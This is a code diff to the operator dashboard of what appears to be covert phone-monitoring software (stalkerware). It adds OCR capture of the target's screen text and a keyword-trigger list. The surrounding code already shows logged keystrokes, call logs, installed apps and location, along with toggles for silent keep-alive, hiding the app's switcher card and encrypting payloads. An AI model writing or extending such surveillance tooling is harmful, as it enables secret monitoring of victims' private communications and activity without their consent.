@@ -84,6 +84,13 @@ h3 { margin:14px 0 6px; font-size:14px; opacity:.75; }
 <button id="addPlace" style="width:auto;white-space:nowrap">Add at last fix</button>
 </div>
 
+<h3>Keywords</h3>
+<div id="kws"></div>
+<div class="row">
+<input id="kw" placeholder="keyword" style="flex:1">
+<button id="addKw" style="width:auto">Add</button>
+</div>
+
 <div id="alerts"></div>
 
 <h3>Toggles</h3>
@@ -356,6 +363,7 @@ if (m.keys) addLog(m.keys, m.dev);
 }
 }
 
+if (m.type === 'ocr') { addLog('screen: ' + (m.lines || []).join(' | '), m.dev); return; }
 if (m.type === 'hist') { (m.rows || []).forEach(function (r) { addLog((r.type || '?') + ' ' + JSON.stringify(r).slice(0, 120), r.dev); }); return; }
 if (m.type === 'call') { addLog('call ' + m.dir + ' ' + (m.state === 'end' ? m.seconds + 's' : 'start'), m.dev); return; }
 if (m.type === 'apps') { addLog('apps: ' + ((m.found || []).join(' ') || 'none'), m.dev); return; }
@@ -396,7 +404,7 @@ var KEYS = [
 ['wifiInfo','Wi-Fi name'],['geofence','Geofence alerts'],['screenTime','Screen Time'],
 ['silentKeepAlive','Silent keep-alive'],['schedule','Scheduling'],['storeAndForward','Store & forward'],
 ['history','History log'],['pushAlerts','Push alerts'],['keywordTriggers','Keyword triggers'],
-['encryption','Encrypt payloads'],['watchdog','Watchdog'],['blankSnapshot','Blank switcher card'],['calls','Call log'],['installedApps','Installed apps'],['netInfo','Network and disk'],['photoLocation','Photo locations']
+['encryption','Encrypt payloads'],['watchdog','Watchdog'],['blankSnapshot','Blank switcher card'],['calls','Call log'],['installedApps','Installed apps'],['netInfo','Network and disk'],['photoLocation','Photo locations'],['ocr','Screen text (OCR)']
 ];
 var savedVals = lsGet('l360.toggles', {});
 var toggles = document.getElementById('toggles');
